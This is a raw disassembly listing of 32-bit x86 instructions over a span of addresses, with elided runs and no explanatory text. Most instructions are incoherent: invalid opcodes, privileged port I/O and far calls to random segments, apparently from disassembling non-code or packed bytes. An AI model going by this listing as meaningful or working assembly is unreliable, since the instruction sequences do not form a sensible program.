  412e9f:	pop    edi
  412ea0:	push   ss
  412ea1:	mul    DWORD PTR [ebx]
  412ea3:	add    ecx,DWORD PTR [edi]
  412ea5:	ret    
  412ea6:	ret    0x713
  412ea9:	neg    ebx
  412eab:	adc    esi,DWORD PTR [ebp+0x4f]
  412eae:	mov    dl,0x8d
  412eb0:	fistp  WORD PTR [ebx-0x54]
  412eb3:	cdq    
  412eb4:	out    dx,al
  412eb5:	jo     0x412e59
  412eb7:	(bad)  
  412eb8:	ret    
  412eb9:	pop    ebx
  412eba:	sbb    eax,0x9270de9e
  412ebf:	(bad)  
  412ec0:	retf   
  412ec1:	jo     0x412ef3
  412ec3:	call   0x81c4f1ea
  412ec8:	out    0x70,eax
  412eca:	lock push es
  412ecc:	mov    edi,0x289f8b16
  412ed1:	add    al,0x6b
  412ed3:	lea    esi,[edi-0x596186a5]
  412ed9:	jo     0x412e79
  412edb:	sbb    edi,eax
  412edd:	jo     0x412edf
	...
  412f07:	loopne 0x412f17
  412f09:	imul   ebp,esi,0x4f
  412f0c:	pop    edx
  412f0d:	fiadd  WORD PTR [esi+0x7087143b]
  412f13:	inc    esp
  412f14:	int    0x7d
  412f16:	jo     0x412f4a
  412f18:	add    BYTE PTR [eax],0xe9
  412f1b:	lods   al,BYTE PTR ds:[esi]
  412f1c:	mov    ?,eax
  412f1e:	outs   dx,BYTE PTR ds:[esi]
  412f1f:	or     bl,BYTE PTR [edx+ecx*2]
  412f22:	test   al,0x1f
  412f24:	adc    dh,BYTE PTR [ebp+ebx*2-0x74]
  412f28:	xchg   DWORD PTR [eax],ecx
  412f2a:	inc    ecx
  412f2b:	ss popf 
  412f2d:	std    
  412f2e:	dec    esi
  412f2f:	in     al,dx
  412f30:	mov    al,0xc7
  412f32:	sub    esp,DWORD PTR [ebx]
  412f34:	pop    ebx
  412f35:	push   ebx
  412f36:	jb     0x412f8b
  412f38:	fcmovnb st,st(4)
  412f3a:	adc    eax,0x5cfe1164
  412f3f:	ficom  DWORD PTR [esi]
  412f41:	push   ecx
  412f42:	shl    BYTE PTR es:[esi-0x3],cl
  412f46:	aam    0x3e
  412f48:	call   0xe931:0x2667e93f
  412f4f:	pop    ds
  412f50:	data16 shl dh,0xa2
  412f54:	sar    edi,0xe8
  412f57:	pop    ds
  412f58:	sbb    al,BYTE PTR [ecx+esi*8+0x1e]
  412f5c:	pop    ebx
  412f5d:	add    cl,ch
  412f5f:	push   esp
  412f60:	xchg   edi,eax
  412f61:	hlt    
  412f62:	out    0x23,al
  412f64:	pop    ebx
  412f65:	add    BYTE PTR [ebx+0x18],dl
  412f68:	test   DWORD PTR [eax],eax
  412f6a:	inc    ebx
	...
  412f93:	add    BYTE PTR [eax],ah
  412f95:	test   DWORD PTR [eax],eax
  412f97:	pop    esp
  412f98:	push   ebp
  412f99:	push   cs
  412f9a:	push   ecx
  412f9b:	je     0x412f42
  412f9d:	push   cs
  412f9e:	idiv   BYTE PTR [esi+0x3cfda203]
  412fa4:	clc    
  412fa5:	adc    BYTE PTR [ebp+ebp*4-0x40],dh
  412fa9:	out    dx,eax
  412faa:	xor    cl,ch
  412fac:	pop    ds
  412fad:	data16 rcl BYTE PTR ds:0xe8730425,0x1f
  412fb5:	pop    ebx
  412fb6:	push   0x9b804c
  412fbb:	add    BYTE PTR [edx-0x5d17f5ec],ah
  412fc1:	sbb    bh,bh
  412fc3:	inc    DWORD PTR ds:0xb88dcd96
  412fc9:	xchg   edx,eax
  412fca:	idiv   bh
  412fcc:	and    BYTE PTR [edi],0x50
  412fcf:	call   0x404a26
  412fd4:	jl     0x412fba
  412fd6:	fincstp 
  412fd8:	push   edx
  412fd9:	and    ch,0x35
  412fdc:	leave  
  412fdd:	cmp    dh,0x6a
  412fe0:	add    eax,0xb468ee36
  412fe5:	pop    ebp
  412fe6:	std    
  412fe7:	mov    ch,0x11
  412fe9:	mov    bh,dh
  412feb:	inc    DWORD PTR [edx]
  412fed:	push   esp
  412fee:	fisttp WORD PTR [eax-0x7c]
  412ff1:	pop    ebp
  412ff2:	call   0xfec1aa2c
  412ff7:	mov    DWORD PTR [eax],eax
	...
  413021:	cmp    BYTE PTR [edi+0x3522fff6],al
  413027:	(bad)  
  413028:	addr16 test al,0x35
  41302b:	inc    ecx
  41302c:	add    BYTE PTR [edx-0x4d08262e],dh
  413032:	cmp    dh,0x35
  413035:	fs aad 0x40
  413038:	add    BYTE PTR [ebp+0x68],ch
  41303b:	inc    ebp
  41303c:	push   DWORD PTR [edx-0x72]
  41303f:	test   ah,ch
  413041:	push   0xffffff80
  413043:	(bad)  
  413044:	push   0xffffff85
  413046:	xor    eax,0x574468f8
  41304b:	std    
  41304c:	mov    ch,0x91
  41304e:	mov    dh,bh
  413050:	push   DWORD PTR [edx+0x448df52]
  413056:	push   edi
  413057:	call   0xfec32c55
  41305c:	mov    DWORD PTR [edi+edi*2],ebx
  41305f:	pop    ecx
  413060:	test   BYTE PTR [ebx-0x20],0xd7
  413064:	inc    ebx
  413066:	fcomp  st(1)
  413068:	inc    eax
  413069:	sbb    al,0x91
  41306b:	mov    eax,0x6e8833db
  413070:	(bad)  
  413071:	jmp    0x1c81ea58
  413076:	stos   BYTE PTR es:[edi],al
  413077:	dec    edx
  413078:	inc    ebp
  413079:	adc    esi,DWORD PTR [edx-0x4dff7b84]
  41307f:	outs   dx,BYTE PTR ds:[esi]
  413080:	(bad)  
  413081:	jbe    0x413085
  413083:	fiadd  DWORD PTR [ebx]
	...
  4130ad:	add    BYTE PTR [ebp-0x5600fe3d],al
  4130b3:	outs   dx,BYTE PTR ds:[esi]
  4130b4:	jbe    0x4130b4
  4130b6:	jmp    0x413101
  4130b8:	cmp    cl,ah
  4130ba:	push   esp
  4130bb:	ret    
  4130bc:	add    eax,ebp
  4130be:	cdq    
  4130bf:	shr    BYTE PTR [esi-0x2],0xa5
  4130c3:	ja     0x413126
  4130c5:	test   bl,0x69
  4130c8:	cmp    BYTE PTR [eax+esi*4+0x1cfe6e69],0x8e
  4130d0:	shl    BYTE PTR [edi+0x1c],cl
  4130d3:	add    bl,BYTE PTR [edi-0x43]
  4130d6:	stos   DWORD PTR es:[edi],eax
  4130d7:	(bad)  
  4130d8:	stc    
  4130d9:	out    0xe6,eax
  4130db:	shr    DWORD PTR [esi-0x2],0x9b
  4130df:	out    dx,eax
  4130e0:	je     0x4130d8
  4130e2:	xchg   ebx,eax
  4130e3:	xor    DWORD PTR [esp+esi*2+0x14],ebp
  4130e7:	sbb    bh,BYTE PTR [edi+0x3f]
  4130ea:	and    DWORD PTR [ecx],0x6c
  4130ed:	mov    ah,0x88
  4130ef:	shr    DWORD PTR [ebx-0x2],1
  4130f2:	jae    0x41313b
  4130f4:	cld    
  4130f5:	out    0x9c,eax
  4130f7:	inc    edx
  4130f8:	imul   edi,esi,0x63
  4130fb:	xchg   DWORD PTR [esi+esi*8+0x5b],ebx
  4130ff:	pop    ebx
  413100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413101:	ins    DWORD PTR es:[edi],dx
  413102:	enter  0x8f62,0xf2
  413106:	or     edx,DWORD PTR [eax]
  413108:	xchg   edi,eax
  413109:	ins    DWORD PTR es:[edi],dx
  41310a:	mov    bh,dh
  41310c:	xchg   esi,eax
  41310d:	ins    DWORD PTR es:[edi],dx
  41310e:	cmp    dl,BYTE PTR [eax]
  413110:	std    
  413111:	sti    
	...
  41313a:	add    BYTE PTR [ebx],bh
  41313c:	ja     0x413165
  41313e:	ins    DWORD PTR es:[edi],dx
  41313f:	sub    dl,BYTE PTR [eax]
  413141:	cmp    eax,0x6f102a64
  413146:	ins    DWORD PTR es:[edi],dx
  413147:	nop
  413148:	arpl   WORD PTR [edi-0x2a],cx
  41314b:	push   ebx
  41314c:	adc    BYTE PTR [edi+0x6d],bl
  41314f:	shr    BYTE PTR [esi],1
  413151:	pop    edi
  413152:	ins    DWORD PTR es:[edi],dx
  413153:	add    dl,BYTE PTR [eax]
  413155:	aad    0xfb
  413157:	add    ebx,ebx
  413159:	inc    ebp
  41315a:	ins    DWORD PTR es:[edi],dx
  41315b:	repnz (bad)
  41315e:	push   eax
  41315f:	repnz getsec 
  413162:	pop    esp
  413163:	xor    eax,0xda6d2e9c
  413168:	lds    edx,FWORD PTR [edi]
  41316a:	jne    0x41313e
  41316c:	movups xmm1,XMMWORD PTR ds:0x6d17105f
  413173:	mov    dh,bh
  413175:	push   ss
  413176:	ins    DWORD PTR es:[edi],dx
  413177:	mov    edx,0xb2c0dc02
  41317c:	ud0    esi,DWORD PTR [esi+0x6cf707c3]
  413183:	mov    ebx,0x9a6caa61
  413188:	setge  BYTE PTR [edi-0x76]
  41318c:	pandn  mm3,QWORD PTR [ebx-0x77]
  413190:	pushf  
  413191:	(bad)  
  413192:	ins    BYTE PTR es:[edi],dx
  413193:	add    ch,0xc7
  413196:	je     0x413212
  413198:	(bad)  
  41319a:	jo     0x413179
  41319c:	movsx  ebp,WORD PTR [eax+eax*1+0x0]
	...
  4131c5:	add    BYTE PTR [eax],al
  4131c7:	add    al,ah
  4131c9:	adc    al,BYTE PTR [ecx]
  4131cb:	sar    BYTE PTR [edi+0xd],0xfe
  4131cf:	scas   al,BYTE PTR es:[edi]
  4131d0:	enter  0xfc86,0x91
  4131d4:	push   eax
  4131d5:	inc    eax
  4131d6:	add    cl,ch
  4131d8:	push   es
  4131d9:	sbb    cl,BYTE PTR [ecx]
  4131db:	jmp    0x6b2e164a
  4131e0:	jecxz  0x4131f5
  4131e2:	imul   ebp,ecx,0x55
  4131e5:	mov    ds:0xf727f4fd,al
  4131ea:	add    ebp,DWORD PTR [ecx]
  4131ec:	mov    cl,0x10
  4131ee:	mov    BYTE PTR [esp+ecx*4],ah
  4131f1:	jbe    0x4131c2
  4131f3:	rcr    esi,1
  4131f5:	push   cs
  4131f6:	call   esp
  4131f8:	pop    es
  4131f9:	test   DWORD PTR [eax],0xfe0d7057
  4131ff:	aam    0x8b
  413201:	or     eax,0x3e57f174
  413206:	inc    eax
  413207:	ds js  0x41322d
  41320a:	ret    
  41320b:	in     eax,dx
  41320c:	pop    ds
  41320d:	test   al,0x89
  41320f:	cmp    eax,0x26f51a9c
  413214:	retf   0xe862
  413217:	xchg   edi,eax
  413218:	sub    bl,BYTE PTR [ebx+0x0]
  41321b:	loop   0x41327c
  41321d:	xchg   DWORD PTR [eax+eiz*1],eax
  413220:	pop    ebp
  413221:	bound  eax,QWORD PTR [eax]
  413223:	push   es
  413224:	stos   BYTE PTR es:[edi],al
  413225:	pop    esi
  413226:	call   0x9c3cb2
  41322b:	loop   0x41322d
	...
  413255:	pop    edi
  413256:	xchg   DWORD PTR [eax+eiz*1],eax
  413259:	frstor [ecx+0x0]
  41325c:	jo     0x4132bb
  41325e:	push   es
  41325f:	(bad)  
  413260:	push   esp
  413261:	clc    
  413262:	cmc    
  413263:	xchg   esp,eax
  413264:	sub    esi,edi
  413266:	or     al,0x88
  413268:	and    al,0x4
  41326a:	or     eax,0x82590074
  41326f:	je     0x413269
  413271:	stos   BYTE PTR es:[edi],al
  413272:	or     al,0xe
  413274:	call   0x400412
  413279:	ds call 0x6af2:0x1bcc3b71
  413281:	xor    eax,0x5f44493
  413286:	xor    BYTE PTR [esp+edi*8-0x63],0xab
  41328b:	push   0xffffffff
  41328d:	call   0xfe32:0x6374be0e
  413294:	setp   cl
  413297:	(bad)  
  413298:	jne    0x413297
  41329a:	mov    cl,0xf6
  41329c:	ds jp  0x413221
  41329f:	(bad)  
  4132a0:	jne    0x41329b
  4132a2:	xor    BYTE PTR [eax+ecx*1+0x5d],0xd1
  4132a7:	jmp    FWORD PTR ds:[edx-0x7e]
  4132ab:	je     0x4132a1
  4132ad:	pop    edx
  4132ae:	or     al,0xfa
  4132b0:	push   DWORD PTR [eax-0x15eb19ef]
  4132b6:	cmp    dh,0xff
	...
  4132e1:	add    BYTE PTR [eax-0x78da1a8b],dl
  4132e7:	cmp    dh,0xc9
  4132ea:	not    DWORD PTR [edx]
  4132ec:	(bad)  
  4132ed:	push   esp
  4132ee:	ds mov bl,0x82
  4132f1:	(bad)  
  4132f2:	icebp  
  4132f3:	sub    bh,bh
  4132f5:	jne    0x4132a0
  4132f7:	mov    cl,0xee
  4132f9:	inc    esi
  4132fa:	stos   BYTE PTR es:[edi],al
  4132fb:	or     BYTE PTR [edx],0xc0
  4132fe:	and    BYTE PTR [ebx+0x5e],bl
  413301:	leave  
  413302:	inc    edi
  413303:	adc    edi,esi
  413305:	mov    WORD PTR [eax-0x79],es
  413308:	dec    ebp
  413309:	push   eax
  41330b:	adc    ah,dh
  41330d:	mov    eax,ds:0xfe693d1c
  413312:	daa    
  413313:	(bad)  
  413314:	cli    
  413315:	cmp    DWORD PTR [ebx+eax*1+0x2],0x0
  41331a:	imul   eax,DWORD PTR [esi+0x68],0xffffffe7
  41331e:	sbb    BYTE PTR [edx+0x69],al
  413321:	(bad)  
  413322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413323:	ss pop eax
  413325:	dec    cl
  413327:	mov    bh,0x6a
  413329:	je     0x413363
  41332b:	in     al,dx
  41332c:	lock div DWORD PTR [ecx+ebx*1]
  413330:	(bad)  
  413331:	(bad)  
  413332:	cmp    edi,DWORD PTR [eax-0x10]
  413335:	jmp    0x41337c
  413337:	mov    al,ds:0x6c1c0001
  41333c:	sbb    BYTE PTR [ecx-0x23],ch
  41333f:	add    edx,eax
  413341:	out    0x6b,eax
  413343:	int3   
  413344:	add    DWORD PTR [eax],eax
	...
  41336e:	add    BYTE PTR [edi],ah
  413370:	inc    edx
  413371:	lock add al,0xf5
  413374:	fiadd  DWORD PTR [ecx]
  413376:	add    BYTE PTR [ecx+edi*2],bl
  413379:	jno    0x4133e2
  41337b:	dec    eax
  41337c:	sbb    eax,ebp
  41337e:	(bad)  
  41337f:	sti    
  413380:	mov    BYTE PTR ds:0x72011c00,dl
  413386:	mov    BYTE PTR [ecx-0x66],ch
  413389:	fnstcw WORD PTR [ebx]
  41338b:	inc    ebp
  41338c:	ret    
  41338d:	add    DWORD PTR [esi-0x3c],edx
  413390:	sub    BYTE PTR [eax],bl
  413392:	add    BYTE PTR [ecx+ecx*1],bl
  413395:	inc    edx
  413396:	je     0x4133b6
  413398:	pop    ecx
  413399:	out    dx,eax
  41339a:	mov    DWORD PTR [edx+edi*2],ecx
  41339d:	shl    dl,1
  41339f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133a0:	mov    edi,0xeaea675d
  4133a5:	(bad)  
  4133a6:	dec    DWORD PTR [ecx+0x5a]
  4133a9:	adc    al,0x2e
  4133ab:	sbb    al,0x2
  4133ad:	(bad)  
  4133ae:	mov    edi,0x5ce95b09
  4133b3:	call   0x421e0b97
  4133b8:	sub    BYTE PTR [eax],0x4
  4133bb:	test   BYTE PTR [ebx+edi*8-0x48a7e3fd],bl
  4133c2:	jnp    0x4133b4
  4133c4:	cs push eax
  4133c6:	sub    ch,dh
  4133c8:	cdq    
  4133c9:	out    0xd1,eax
  4133cb:	inc    ebx
  4133cc:	cld    
  4133cd:	cld    
  4133ce:	add    ebx,DWORD PTR [eax+eiz*2]
  4133d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133d2:	out    dx,eax
	...
  4133fb:	add    BYTE PTR ds:0x137de300,bl
  413401:	jecxz  0x41343f
  413403:	push   ecx
  413404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413405:	xchg   esi,eax
  413406:	scas   eax,DWORD PTR es:[edi]
  413407:	jge    0x4133e1
  413409:	imul   BYTE PTR [ebp+0x24e01c04]
  41340f:	dec    esp
  413410:	pop    ecx
  413411:	pop    ebx
  413412:	out    0x68,eax
  413414:	nop
  413415:	das    
  413416:	outs   dx,DWORD PTR ds:[esi]
  413417:	out    dx,eax
  413418:	sti    
  413419:	or     ebx,ebp
  41341b:	sti    
  41341c:	add    ebp,eax
  41341e:	pop    ebp
  41341f:	imul   eax,DWORD PTR [edx],0xa664bce1
  413425:	xchg   ebp,eax
  413426:	inc    ebx
  413427:	jl     0x41344c
  413429:	loope  0x4133c7
  41342b:	push   eax
  41342c:	xchg   esi,eax
  41342d:	xchg   ebp,eax
  41342e:	pop    ds
  41342f:	jl     0x413444
  413431:	fcomi  st,st(5)
  413433:	add    ebp,DWORD PTR [ebx]
  413435:	(bad)  
  413436:	xchg   ebx,eax
  413437:	push   0xef270bd2
  41343c:	mov    bh,0x2
  41343e:	enter  0xc2c2,0xb
  413442:	gs mov edi,0xb8ffaacb
  413448:	pop    edx
  413449:	or     al,0x7
  41344b:	pop    ebp
  41344c:	stos   DWORD PTR es:[edi],eax
  41344d:	lods   eax,DWORD PTR ds:[esi]
  41344e:	xor    BYTE PTR [esi+0x17],al
  413451:	pop    ebx
  413452:	add    BYTE PTR [eax+ebx*1-0x748b0200],bl
  413459:	repz pop ebx
  41345b:	sub    al,0xf5
  41345d:	or     al,0xa
  41345f:	test   eax,0x0
	...
  413488:	add    BYTE PTR [ebx+0x42],dh
  41348b:	push   0x9a56e6
  413490:	cmp    eax,edx
  413492:	add    al,BYTE PTR [ebp-0x3a]
  413495:	hlt    
  413496:	fwait
  413497:	push   0x4bce3e
  41349c:	inc    ecx
  41349d:	and    BYTE PTR [ebx-0x13],bl
  4134a0:	outs   dx,DWORD PTR ds:[esi]
  4134a1:	ja     0x41350e
  4134a3:	sub    BYTE PTR [bx+si],ah
  4134a6:	stos   DWORD PTR es:[edi],eax
  4134a7:	std    
  4134a8:	adc    al,0x40
  4134aa:	repz and al,0x1
  4134ad:	lds    ecx,FWORD PTR [ecx+ebp*8]
  4134b0:	mov    cl,0x5f
  4134b2:	or     al,0xfe
  4134b4:	mov    al,0xe1
  4134b6:	push   ebx
  4134b7:	add    BYTE PTR [ecx+eiz*4],dl
  4134ba:	inc    DWORD PTR [ecx+0x7483ad]
  4134c0:	add    edx,edx
  4134c2:	or     DWORD PTR [ecx+esi*8+0x67],esi
  4134c6:	add    al,0x3c
  4134c8:	pop    esi
  4134c9:	je     0x41349e
  4134cb:	inc    ebx
  4134cc:	push   ebp
  4134cd:	fldenv [ebp+edi*8-0x2c]
  4134d1:	test   DWORD PTR [edx],0x97446a4
  4134d7:	imul   ecx,DWORD PTR [edx],0x75
  4134da:	(bad)
  4134de:	or     esi,edi
  4134e0:	cs icebp 
  4134e2:	data16 std 
  4134e4:	pushf  
  4134e5:	mov    DWORD PTR [edx],0x9341e90
  4134eb:	imul   ebp,ecx,0x0
	...
  413515:	add    BYTE PTR [edi],bl
  413517:	cli    
  413518:	mov    esi,0x3f742181
  41351d:	add    BYTE PTR [ebp+0x74690f26],dh
  413523:	pop    esi
  413524:	std    
  413525:	jne    0x4135a4
  413527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413528:	(bad)  
  413529:	imul   eax,DWORD PTR [edx-0x7e8a017e],0x6d087482
  413533:	je     0x413571
  413535:	call   DWORD PTR [edx+0x48]
  413538:	mov    edi,0x8b2b8504
  41353d:	in     al,dx
  41353e:	hlt    
  41353f:	call   0x458c:0x82a2f7d5
  413546:	xchg   ecx,eax
  413547:	das    
  413548:	push   DWORD PTR [ebp+0x71]
  41354b:	xor    DWORD PTR [eax+ecx*1-0x53],0x350029ec
  413553:	add    eax,0x9ec80fbe
  413558:	add    BYTE PTR [eax],al
  41355a:	inc    ebp
  41355b:	dec    ecx
  41355c:	inc    esp
  41355d:	clc    
  41355e:	xor    eax,0x7a00005e
  413563:	sbb    al,0xf2
  413565:	dec    DWORD PTR [edx]
  413567:	pop    esi
  413568:	add    BYTE PTR [edx+0x5],ch
  41356b:	and    al,0xfe
  41356d:	imul   esi,ebp,0xb88cfe23
  413573:	jns    0x4135c2
  413575:	lea    ecx,[eax+0xfff68b]
	...
  4135a3:	bound  ebp,QWORD PTR [edi]
  4135a5:	push   DWORD PTR [ebp+0x5d]
  4135a8:	xor    BYTE PTR [esp+edi*8+0x4d],0x2a
  4135ad:	sub    al,BYTE PTR [eax]
  4135af:	lds    eax,FWORD PTR [esi+edi*4]
  4135b2:	je     0x41356c
  4135b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135b5:	add    BYTE PTR [ecx],0xb5
  4135b8:	pop    ebp
  4135b9:	push   0xfe1e8dbd
  4135be:	(bad)  
  4135bf:	sbb    al,0xe7
  4135c1:	cmc    
  4135c2:	out    0x74,eax
  4135c4:	mov    ah,0x66
  4135c6:	dec    BYTE PTR [ebp+ecx*4+0x54]
  4135ca:	mov    WORD PTR [ecx-0x640190f1],ds
  4135d0:	jecxz  0x4135a1
  4135d2:	out    0xc4,eax
  4135d4:	mov    ah,0x66
  4135d6:	(bad)  
  4135d7:	xchg   ebp,eax
  4135d8:	jbe    0x413623
  4135da:	test   BYTE PTR [ebx+0x3bfd5a28],0x31
  4135e1:	imul   ebx,DWORD PTR [si],0xdd68da9c
  4135e8:	repz data16 mov ah,0x44
  4135ec:	shl    BYTE PTR [esi-0x2],1
  4135ef:	pop    ebx
  4135f0:	inc    esi
  4135f1:	cld    
  4135f2:	out    0x1d,eax
  4135f4:	xor    eax,0x7695fe65
  4135f9:	jno    0x4135f1
  4135fb:	inc    ebx
  4135fc:	call   0x650535d8
  413601:	fild   DWORD PTR [eax+0x1c]
  413604:	fnstenv [eax+0xd7]
	...
  41362e:	add    BYTE PTR [eax],al
  413630:	xor    esp,eax
  413632:	data16 (bad) 
  413634:	test   eax,0x5ee55a0b
  413639:	xchg   ecx,eax
  41363a:	data16 mov BYTE PTR [ecx+0xbfe6e86],bl
  413641:	sub    eax,0x2b806802
  413646:	(bad)  
  413649:	out    0x49,eax
  41364b:	div    bl
  41364d:	cdq    
  41364e:	data16 je 0x413665
  413651:	stos   BYTE PTR es:[edi],al
  413652:	cmp    al,BYTE PTR [ecx-0x1d]
  413655:	dec    ecx
  413656:	jl     0x4135dc
  413658:	les    ecx,FWORD PTR [ecx+0x66]
  41365b:	(bad)  
  41365c:	mov    eax,ds:0xcbf6457f
  413661:	pop    ebx
  413662:	sar    DWORD PTR es:[ebx],cl
  413665:	ficom  WORD PTR [eax+0x5d09bbc4]
  41366b:	dec    ebx
  41366c:	stos   BYTE PTR es:[edi],al
  41366d:	or     BYTE PTR [edi],cl
  41366f:	data16 xor BYTE PTR [ebx+0xf],dl
  413673:	call   0xffa0:0x7bff085d
  41367a:	(bad)  
  41367b:	gs xchg edx,eax
  41367d:	jne    0x413666
  41367f:	fistp  DWORD PTR [ebx-0x7cfbd78e]
  413685:	into   
  413686:	mov    edi,0xd7087a6d
  41368b:	out    dx,eax
  41368c:	sbb    esi,ebx
  41368e:	ja     0x413652
  413690:	push   0x8
  413692:	jno    0x413713
	...
  4136bc:	add    BYTE PTR [ebx+0x10],al
  4136bf:	mov    edi,0xb7c69e65
  4136c4:	ins    DWORD PTR es:[edi],dx
  4136c5:	push   edx
  4136c6:	or     al,ch
  4136c8:	out    dx,eax
  4136c9:	mov    dh,0xdb
  4136cb:	fs pop eax
  4136cd:	dec    edx
  4136ce:	or     BYTE PTR [edi+0x6a7cb004],bl
  4136d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136d5:	cmp    edx,DWORD PTR [eax]
  4136d7:	(bad)  
  4136d8:	sub    ecx,DWORD PTR gs:[eax+eiz*1-0x70f7dc24]
  4136e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136e1:	sbb    cl,BYTE PTR [esi+0x44165bd7]
  4136e7:	outs   dx,BYTE PTR ds:[esi]
  4136e8:	gs or  cl,dh
  4136eb:	push   edi
  4136ec:	ins    DWORD PTR es:[edi],dx
  4136ed:	add    cl,BYTE PTR [eax]
  4136ef:	pop    edi
  4136f0:	out    dx,eax
  4136f1:	sub    esi,ebx
  4136f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136f4:	daa    
  4136f5:	repz pop es
  4136f7:	dec    edi
  4136f8:	scas   eax,DWORD PTR es:[edi]
  4136f9:	test   DWORD PTR [edi],0x8de26547
  4136ff:	xlat   BYTE PTR ds:[ebx]
  413700:	pop    ebx
  413701:	pop    esp
  413702:	inc    edi
  413703:	add    BYTE PTR [esi],dh
  413705:	cmp    DWORD PTR [ecx],ecx
  413707:	mov    ah,0x41
  413709:	cmp    DWORD PTR [ecx],ecx
  41370b:	(bad)  
  41370c:	es mov bl,0x57
  41370f:	call   0xfe493aee
  413714:	push   ss
  413715:	and    DWORD PTR [ebx],0xfffffff6
  413718:	push   cs
  413719:	inc    ecx
  41371a:	or     DWORD PTR [ebp+ecx*1-0x101f6cf],esi
	...
  413749:	add    BYTE PTR [edx+0x44fae857],cl
  41374f:	or     dh,bh
  413751:	out    dx,al
  413752:	mov    edx,0xf8e6f627
  413757:	or     BYTE PTR [ecx+edi*8-0x29],dh
  41375b:	push   0x3c
  41375d:	(bad)  
  41375e:	clc    
  41375f:	or     BYTE PTR [ecx+edi*8+0x0],dh
  413763:	iret   
  413764:	fdivr  DWORD PTR [esi+0x34fe08f8]
  41376a:	pop    eax
  41376b:	push   DWORD PTR [edx-0x49]
  41376e:	mov    eax,0xd774fe08
  413773:	adc    dh,bh
  413775:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413776:	out    0xf9,eax
  413778:	ds sahf 
  41377a:	ror    BYTE PTR [eax],0xb4
  41377d:	cdq    
  41377e:	ror    BYTE PTR [eax],0xfe
  413781:	sbb    eax,0xb886fd45
  413787:	into   
  413788:	in     al,dx
  413789:	jbe    0x41370b
  41378b:	add    eax,0x639a5e9
  413790:	(bad)  
  413791:	outs   dx,BYTE PTR ds:[esi]
  413792:	mov    edx,0x7866f5fe
  413797:	(bad)  
  413798:	mov    edi,0xfe05811f
  41379d:	pushf  
  41379e:	push   ebx
  41379f:	or     eax,0xd0474efe
  4137a4:	add    BYTE PTR ds:[edx+0x7f],bl
  4137a8:	(bad)  
  4137a9:	mov    ch,0x65
  4137ab:	ja     0x4137ab
  4137ad:	inc    DWORD PTR [eax]
	...
  4137d7:	pop    ebp
  4137d8:	jecxz  0x413815
  4137da:	(bad)  
  4137db:	cli    
  4137dc:	jle    0x413822
  4137de:	clc    
  4137df:	sub    al,0xcf
  4137e1:	sti    
  4137e2:	call   FWORD PTR [edx]
  4137e4:	jg     0x41385a
  4137e6:	cld    
  4137e7:	sbb    eax,0xb5002747
  4137ec:	inc    ecx
  4137ed:	mov    edi,0x8b15b50c
  4137f2:	in     al,dx
  4137f3:	push   es
  4137f4:	inc    esi
  4137f5:	stc    
  4137f6:	push   0xffffff85
  4137f8:	and    al,0x4b
  4137fa:	call   DWORD PTR [eax]
  4137fc:	add    ah,dh
  4137fe:	mov    ebp,0x89fe7a3e
  413803:	inc    eax
  413804:	jnp    0x413804
  413806:	jne    0x413885
  413808:	repnz inc ebx
  41380a:	imul   esi,DWORD PTR [edi+ebx*2],0x175435fd
  413811:	inc    ecx
  413812:	add    BYTE PTR [ebp-0x5d],ch
  413815:	cld    
  413816:	dec    DWORD PTR [edx-0x22f78b86]
  41381c:	adc    BYTE PTR [ecx+0x41],ch
  41381f:	xor    eax,0x45fffff2
  413824:	(bad)  
  413826:	loop   0x4137b0
  413828:	jp     0x413828
  41382a:	call   DWORD PTR [eax]
  41382c:	jnp    0x41382c
  41382e:	jne    0x41385d
  413830:	jb     0x4137ff
  413832:	cmp    ebx,DWORD PTR [edx+0x1c2c87a]
  413838:	pop    edx
  413839:	push   ebx
  41383a:	mov    eax,DWORD PTR [eax]
	...
  413864:	mov    esi,ebx
  413866:	sar    esp,0xef
  413869:	pop    ecx
  41386a:	push   0x4c
  41386c:	pop    edx
  41386d:	and    al,0x6
  41386f:	call   0xff606090
  413874:	jmp    0x4138f0
  413876:	(bad)  
  413877:	sti    
  413878:	je     0x41386e
  41387a:	add    edi,ebp
  41387c:	call   0xe9f4:0x5d68812b
  413883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413884:	xor    eax,0x49ff01b3
  413889:	or     al,0x6a
  41388b:	pop    esi
  41388c:	inc    ebx
  41388d:	gs popa 
  41388f:	(bad)  
  413890:	sub    DWORD PTR [eax+0x61],esi
  413893:	je     0x4138a9
  413895:	pop    esp
  413896:	ja     0x4138d2
  413898:	mov    ds:0x20c14b5c,eax
  41389d:	hlt    
  41389e:	mov    eax,0x4872808a
  4138a3:	iret   
  4138a4:	xchg   ebx,eax
  4138a5:	hlt    
  4138a6:	bound  ecx,QWORD PTR [ecx+ebx*8-0xe014e01]
  4138ad:	mul    DWORD PTR [edx+0x74]
  4138b0:	and    al,0x1c
  4138b2:	xor    DWORD PTR [edx],ebp
  4138b4:	sbb    al,0xf4
  4138b6:	push   cs
  4138b7:	rcl    BYTE PTR [ebx],0x77
  4138ba:	clc    
  4138bb:	add    DWORD PTR [esp+esi*8],ebx
  4138be:	dec    edx
  4138bf:	inc    esp
  4138c0:	push   esp
  4138c1:	repz add DWORD PTR [eax],eax
  4138c4:	sbb    al,0xbd
  4138c6:	enter  0xf3,0x0
	...
  4138ee:	add    BYTE PTR [eax],al
  4138f0:	add    BYTE PTR [ebx-0xc],al
  4138f3:	add    DWORD PTR [eax],eax
  4138f5:	(bad)  
  4138f6:	repz jmp 0x4138f8
  4138f9:	(bad)
  4138fc:	call   FWORD PTR [eax-0x6eb0a7c2]
  413902:	jbe    0x413959
  413904:	neg    BYTE PTR [ebx]
  413906:	xchg   BYTE PTR [ecx+0x628a89fe],dh
  41390c:	je     0x413916
  41390e:	(bad)  [edx+0x28]
  413911:	sbb    al,0x5b
  413913:	out    0xe,eax
  413915:	fmul   QWORD PTR [edi+0x5acb6ce4]
  41391b:	out    0x3,eax
  41391d:	je     0x4138e5
